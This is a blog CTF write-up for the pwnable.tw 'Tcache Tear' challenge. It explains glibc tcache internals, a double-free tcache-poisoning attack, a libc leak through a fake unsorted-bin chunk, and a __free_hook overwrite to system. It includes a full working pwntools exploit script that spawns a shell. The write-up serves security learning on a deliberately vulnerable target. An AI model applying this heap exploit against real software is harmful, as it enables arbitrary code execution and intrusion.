<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="pwnable.tw - Tcache Tear" property="og:title"><meta content="article" property="og:type"><meta content="2020-02-23T07:19:49.665Z" property="og:published_time"><meta content="2020-03-02T18:52:31.838Z" property="og:modified_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="ctf-writeups" property="og:section"><meta content="pwnable.tw" property="og:tag"><meta content="binary-exploitation" property="og:tag"><meta content="heap-exploitation" property="og:tag"><meta content="pwntools" property="og:tag"><meta content="double-free" property="og:tag"><meta content="/posts/pwnable-tw-tcache-tear/" property="og:url"><title>pwnable.tw - Tcache Tear - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div></nav><section class="section"><div class="container"><div class="blog-container"><div class="blog-header"><h1 class="title">pwnable.tw - Tcache Tear</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2020-02-23T07:19:49.665Z&#10;Updated: 2020-03-02T18:52:31.838Z">February 23, 2020* </span>in ctf-writeups</span></div><div class="tags"><a href="&#x2F;tags&#x2F;pwnable-tw&#x2F;"><span class="interactive minimal tag">pwnable.tw</span></a> <a href="&#x2F;tags&#x2F;binary-exploitation&#x2F;"><span class="interactive minimal tag">binary-exploitation</span></a> <a href="&#x2F;tags&#x2F;heap-exploitation&#x2F;"><span class="interactive minimal tag">heap-exploitation</span></a> <a href="&#x2F;tags&#x2F;pwntools&#x2F;"><span class="interactive minimal tag">pwntools</span></a> <a href="&#x2F;tags&#x2F;double-free&#x2F;"><span class="interactive minimal tag">double-free</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#background" data-target="background">Background</a><ul><li><a href="#tcache-perthread-struct" data-target="tcache-perthread-struct">tcache_perthread_struct</a></li><li><a href="#tcache-entry" data-target="tcache-entry">tcache_entry</a></li></ul></li><li><a href="#behind-the-scenes-tcache" data-target="behind-the-scenes-tcache">Behind the Scenes: tcache</a></li><li><a href="#reversing" data-target="reversing">Reversing</a></li><li><a href="#attacks" data-target="attacks">Attacks</a><ul><li><a href="#circular-list" data-target="circular-list">Circular List</a></li><li><a href="#achieving-arbitrary-write" data-target="achieving-arbitrary-write">Achieving Arbitrary Write</a></li><li><a href="#leaking-libc" data-target="leaking-libc">Leaking libc</a></li><li><a href="#crafting-chunks" data-target="crafting-chunks">Crafting Chunks</a></li><li><a href="#getting-a-shell" data-target="getting-a-shell">Getting a Shell</a></li></ul></li><li><a href="#solution" data-target="solution">Solution</a></li><li><a href="#further-reading" data-target="further-reading">Further Reading</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>Make tcache great again !</p><p><code>nc chall.pwnable.tw 10207</code></p><p><a href="https://pwnable.tw/static/chall/tcache_tear">tcache_tear</a></p><p><a href="https://pwnable.tw/static/libc/libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so">libc.so</a></p></blockquote><h1 id="background">Background</h1><p>Per-thread cache (tcache) is an optimization enabled in versions of <code>libc</code> after 2.26. To increase heap performance, security checks are limited within the tcache implementation. Tcache is implemented using two important internal structures:</p><span id="continue-reading"></span><h2 id="tcache-perthread-struct"><a href="https://github.com/bminor/glibc/blob/release/2.27/master/malloc/malloc.c#L2916">tcache_perthread_struct</a></h2><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">typedef struct</span><span style="color:#323232;"> tcache_perthread_struct
{
  </span><span style="font-weight:bold;color:#a71d5d;">char</span><span style="color:#323232;"> counts[TCACHE_MAX_BINS];
  tcache_entry </span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#323232;">entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
</span></code></pre><p>There is maximum number of entries and bins within the tcache that are defined at compile time.</p><h2 id="tcache-entry"><a href="https://github.com/bminor/glibc/blob/release/2.27/master/malloc/malloc.c#L2904">tcache_entry</a></h2><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
</span></code></pre><p>This structure is placed within the user area of a chunk when it is freed, i.e. it is placed at the address returned by <code>malloc</code>. This has some security implications.</p><h1 id="behind-the-scenes-tcache">Behind the Scenes: tcache</h1><p>The below diagram depicts normal operation of tcache with the given initial conditions.</p><p>svg(path=&quot;5e5d5509c800e40a7578f781.svg&quot;)</p><h1 id="reversing">Reversing</h1><p>First, we have to reverse the binary, which isn't too difficult with Ghidra.</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">void main(void)

{
  longlong input;
  uint i;
  
  set_alarm();
  printf(&quot;Name:&quot;);
  read(buffer,0x20);
  i = 0;
  do {
    while( true ) {
      while( true ) {
        print_menu();
        input = read_ll();
        if (input != 2) break;
        if (i &lt; 8) {
          free(malloced);
          i = i + 1;
        }
      }
      if (2 &lt; input) break;
      if (input == 1) {
        malloc_m();
      }
      else {
LAB_00400c75:
        puts(&quot;Invalid choice&quot;);
      }
    }
    if (input != 3) {
      if (input == 4) {
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      goto LAB_00400c75;
    }
    print_buffer();
  } while( true );
}
</span></code></pre><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">void malloc_m(void)

{
  ulong size;
  
  printf(&quot;Size:&quot;);
  size = read_ll();
  if (size &lt; 0x100) {
    malloced = malloc(size);
    printf(&quot;Data:&quot;);
    read((char *)malloced,(int)size - 0x10);
    puts(&quot;Done !&quot;);
  }
  return;
}
</span></code></pre><p>The binary reads <code>0x20</code> bytes into a global buffer. Then, it displays a menu:</p><p><img alt="" src="/posts/pwnable-tw-tcache-tear/5d99297adf0cde08ea5c061d.png"></p><p>We are able to <code>malloc</code> arbitrary sizes (under 0x100) and <code>free</code> the last allocated chunk (up to 8 times).</p><h1 id="attacks">Attacks</h1><h2 id="circular-list">Circular List</h2><p>The given tcache implementation has no checks to detect double frees. Consider the following initial state:</p><p>svg(path=&quot;5e5d5542c800e40a7578f783.svg&quot;)</p><p>If we call <code>free(0x603260)</code> twice, we add the <code>tcache_entry</code> to the free list again, which results in a circular list:</p><p>svg(path=&quot;5e5d5552c800e40a7578f785.svg&quot;)</p><p>If we call <code>malloc</code> now with the same size as the double freed chunk, we will receive that chunk again. If we are able to write in the chunk, we can overwrite the <code>next</code> pointer because libc does not expect the chunk to be in use. Then, <code>malloc</code> will return the written address + 0x10 due to the chunk header.</p><h2 id="achieving-arbitrary-write">Achieving Arbitrary Write</h2><p>We can abuse this double free to force malloc to return an arbitrary pointer to any memory location. Because the binary allows us to write to the location returned by malloc, we have arbitrary write:</p><p>svg(path=&quot;5e5d5571c800e40a7578f787.svg&quot;)</p><h2 id="leaking-libc">Leaking libc</h2><p>Even with the arbitrary write, we don't have anything to write to. Leaking libc will allow us to overwrite <code>__free_hook</code> or <code>__malloc_hook</code> with a call to system.</p><p>The internal representation of a free <code>chunk</code> is something similar to:</p><p>svg(path=&quot;5e5d558bc800e40a7578f789.svg&quot;)</p><p>Unsorted bins are a circularly linked list. This means that in an unsorted bin with a single chunk, the chunk will have its <code>fwd</code> and <code>bck</code> pointers set to the address of the unsorted bin. If we are able to read either the <code>fwd</code> or <code>bck</code> pointer, we have an address with a known offset from libc.</p><h2 id="crafting-chunks">Crafting Chunks</h2><p>Luckily, we have the <code>name</code> buffer and can print its contents. If we create a fake chunk of unsorted bin size and place it in the name buffer, we can leak libc.</p><p>Unfortunately, there are some <a href="https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks.html">security checks</a>:</p><ul><li>&quot;Check whether next chunk's (by memory) previous in use bit is marked&quot;</li><li>&quot;Check whether size of next chunk is within the minimum and maximum size (av-&gt;system_mem)&quot;</li><li>&quot;If the chunk is not within the size range of fastbin and isn't mmapped, check that it is not the same as the top chunk&quot;</li></ul><p>To bypass these checks we can create another chunk that is positioned immediately after the first chunk. The comments in the solution script explain this further.</p><h2 id="getting-a-shell">Getting a Shell</h2><p>Now that we have the libc base address, we can get the address of <code>__free_hook</code>. This is a function pointer that is called whenever free is called; the address of the chunk being freed is passed as a parameter. Conveniently, this function signature matches <code>system(char* cmd)</code>.</p><p>Now, if we call <code>malloc(&quot;/bin/sh\x00&quot;)</code> and then free the returned value, a shell is created.</p><h1 id="solution">Solution</h1><pre style="background-color:#ffffff;">
<code><span style="font-weight:bold;color:#a71d5d;">from </span><span style="color:#323232;">pwn </span><span style="font-weight:bold;color:#a71d5d;">import </span><span style="color:#0086b3;">*

</span><span style="color:#323232;">context.terminal </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#183691;">&#39;/bin/sh&#39;

</span><span style="color:#323232;">r </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">remote(</span><span style="color:#183691;">&quot;chall.pwnable.tw&quot;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">10207</span><span style="color:#323232;">)


elf </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./tcache_tear&#39;</span><span style="color:#323232;">)
libc </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">ELF(</span><span style="color:#183691;">&#39;./libc.so.6&#39;</span><span style="color:#323232;">)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">malloc</span><span style="color:#323232;">(size, data):
	</span><span style="font-weight:bold;color:#a71d5d;">global </span><span style="color:#323232;">malloc_counter
	malloc_counter </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">1

	</span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#183691;">&#39;1&#39;</span><span style="color:#323232;">)
	r.recvuntil(</span><span style="color:#183691;">&#39;Size:&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#0086b3;">str</span><span style="color:#323232;">(size))
	r.recvuntil(</span><span style="color:#183691;">&#39;Data:&#39;</span><span style="color:#323232;">)
	r.send(data)
	
	info(</span><span style="color:#183691;">&quot;[Malloc </span><span style="color:#0086b3;">%d</span><span style="color:#183691;">] Allocated chunk [size: </span><span style="color:#0086b3;">%d</span><span style="color:#183691;">, data: </span><span style="color:#0086b3;">%s</span><span style="color:#183691;">]&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(malloc_counter, size, data))

free_counter </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0
</span><span style="color:#323232;">malloc_counter </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">free</span><span style="color:#323232;">():
	</span><span style="font-weight:bold;color:#a71d5d;">global </span><span style="color:#323232;">free_counter
	free_counter </span><span style="font-weight:bold;color:#a71d5d;">+= </span><span style="color:#0086b3;">1
	</span><span style="color:#323232;">r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#183691;">&#39;2&#39;</span><span style="color:#323232;">)
	info(</span><span style="color:#183691;">&quot;  [Free </span><span style="color:#0086b3;">{n}</span><span style="color:#183691;">] Freed last allocated chunk&quot;</span><span style="color:#323232;">.format(n</span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;">free_counter))


</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">mem_write</span><span style="color:#323232;">(address, value, s):
	info(</span><span style="color:#183691;">&quot;[Mem Write ] Writing </span><span style="color:#0086b3;">%s</span><span style="color:#183691;"> to </span><span style="color:#0086b3;">%s</span><span style="color:#183691;">&quot; </span><span style="font-weight:bold;color:#a71d5d;">% </span><span style="color:#323232;">(value, </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(address)))
	malloc(s, </span><span style="color:#183691;">&quot;anything&quot;</span><span style="color:#323232;">)
	free()
	free()
	malloc(s, p64(address))
	malloc(s, p64(address))
	malloc(s, value)

</span><span style="font-weight:bold;color:#a71d5d;">def </span><span style="font-weight:bold;color:#323232;">get_info</span><span style="color:#323232;">():
	r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	r.send(</span><span style="color:#183691;">&#39;3&#39;</span><span style="color:#323232;">)
	r.recvuntil(</span><span style="color:#183691;">&#39; :&#39;</span><span style="color:#323232;">)
	</span><span style="font-weight:bold;color:#a71d5d;">return </span><span style="color:#323232;">r.recv(</span><span style="color:#0086b3;">0x20</span><span style="color:#323232;">)

</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(elf.got)
</span><span style="color:#62a35c;">print</span><span style="color:#323232;">(elf.symbols)

r.recvuntil(</span><span style="color:#183691;">&#39;Name:&#39;</span><span style="color:#323232;">)
r.send(</span><span style="color:#183691;">&#39;anything&#39;</span><span style="color:#323232;">)


mem_write(</span><span style="color:#0086b3;">0x602550</span><span style="color:#323232;">, 
			p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Previous Size
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x21</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># Chunk Size (A=0, M=0, P=1)
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Forward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Backward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+ 	</span><span style="font-style:italic;color:#969896;"># Empty Space
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x21</span><span style="color:#323232;">),	</span><span style="font-style:italic;color:#969896;"># Next Previous Size
		</span><span style="color:#0086b3;">0x70</span><span style="color:#323232;">)

mem_write(</span><span style="color:#0086b3;">0x602050</span><span style="color:#323232;">,
			p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602050		Previous Size 
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x501</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602058		Chunk Size (A=0, M=0, P=1)
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602060[name_buffer]	Forward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">) </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602068		Backward Pointer
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0</span><span style="color:#323232;">)</span><span style="font-weight:bold;color:#a71d5d;">*</span><span style="color:#0086b3;">3 </span><span style="font-weight:bold;color:#a71d5d;">+	</span><span style="font-style:italic;color:#969896;"># 0x602070		Empty Space
			</span><span style="color:#323232;">p64(</span><span style="color:#0086b3;">0x602060</span><span style="color:#323232;">),	</span><span style="font-style:italic;color:#969896;"># 0x602088[malloced] 	Overwrite the last malloced value
		</span><span style="color:#0086b3;">0x60</span><span style="color:#323232;">)

</span><span style="font-style:italic;color:#969896;"># Next free will be free(0x602060) because we overwrote the last malloced value.

# Note that we need the free to be 0x602060 because free expects the user region of the chunk,
# not the start of the chunk

</span><span style="color:#323232;">free()  </span><span style="font-style:italic;color:#969896;"># free(0x602060)

# This free will overwrite the forward and backward pointer. Since this chunk is the only chunk 
# stored in an unsorted bin, the fwd and bck pointers will point to the location of the bin within
# libc. This location will have a constant offset with libc base.

</span><span style="color:#0086b3;">LEAKED_CHUNK_OFFSET </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">0x3ebca0

</span><span style="color:#323232;">leaked_chunk_addr </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">u64(get_info()[:</span><span style="color:#0086b3;">8</span><span style="color:#323232;">]) </span><span style="font-style:italic;color:#969896;"># Leaked address of malloc chunk

</span><span style="color:#0086b3;">LIBC_BASE </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#323232;">leaked_chunk_addr </span><span style="font-weight:bold;color:#a71d5d;">- </span><span style="color:#0086b3;">LEAKED_CHUNK_OFFSET
</span><span style="color:#323232;">libc.address </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">LIBC_BASE

</span><span style="color:#323232;">info(</span><span style="color:#183691;">&quot;Leaked chunk at &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(leaked_chunk_addr))
info(</span><span style="color:#183691;">&quot;Found libc base: &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(</span><span style="color:#0086b3;">LIBC_BASE</span><span style="color:#323232;">))
info(</span><span style="color:#183691;">&quot;Found __free_hook address: &quot; </span><span style="font-weight:bold;color:#a71d5d;">+ </span><span style="color:#62a35c;">hex</span><span style="color:#323232;">(libc.symbols[</span><span style="color:#183691;">&#39;__free_hook&#39;</span><span style="color:#323232;">]))

mem_write(libc.symbols[</span><span style="color:#183691;">&#39;__free_hook&#39;</span><span style="color:#323232;">] , p64(libc.symbols[</span><span style="color:#183691;">&#39;system&#39;</span><span style="color:#323232;">]), </span><span style="color:#0086b3;">0x50</span><span style="color:#323232;">)
malloc(</span><span style="color:#0086b3;">0x50</span><span style="color:#323232;">, </span><span style="color:#183691;">&quot;/bin/sh</span><span style="color:#0086b3;">\x00</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">)

free()

r.interactive()
</span></code></pre><h1 id="further-reading">Further Reading</h1><p>These are some resources that I found helpful when solving this challenge.</p><ol><li><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/">https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</a></li><li><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c">https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_poisoning.c</a></li><li><a href="https://heap-exploitation.dhavalkapil.com/">https://heap-exploitation.dhavalkapil.com/</a></li></ol></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="ðŸ’¬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>